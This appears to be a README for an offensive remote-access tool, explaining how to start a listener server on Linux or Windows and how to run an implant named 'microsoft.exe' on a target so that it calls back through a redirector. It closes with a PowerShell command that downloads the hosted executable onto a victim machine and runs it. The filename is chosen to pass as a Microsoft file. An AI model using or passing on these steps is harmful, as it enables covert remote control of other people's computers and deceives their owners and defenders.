# Remote Process Tool Setup Guide

# Linux Server Guide

	- Linux server ELF is found in Server/linux-x64/publish/DLServer

	- chmod DLServer and run it by calling ./DLServer [port]

	- This will start a TcpListener on port "port" *If port is left blank the default port is set to 8080*


# Windows Server Guide

	- Windows server EXE is found in Server\win-x64\publish\DLServer.exe

	- This can be run by calling .\DLServer.exe [port]

	- This will start a TcpListener on port "port" *If port is left blank the default port is set to 8080*


# Target Execution Guide

	- The target EXE is found in the "WinBinary" directory labelled as "microsoft.exe"

	- If you are using a redirector run the command ".\microsoft.exe [redirector_ip] [redirector_port]"

	- If you are doing a straight callback to your server run the command ".\microsoft.exe [your_ip] [your_port]" *Note this is not recommended*


# Attacker Execution Guide

	- Setup your redirector to listen and forward to your DLServer

	- Host the windows executable on a HTTP server

	- Run the following command on the client to download and execute:
		"Invoke-WebRequest "hosted_exe" -OutFile microsoft.exe;.\microsoft.exe [redirector_ip] [redirector_port]" or do whatever you want
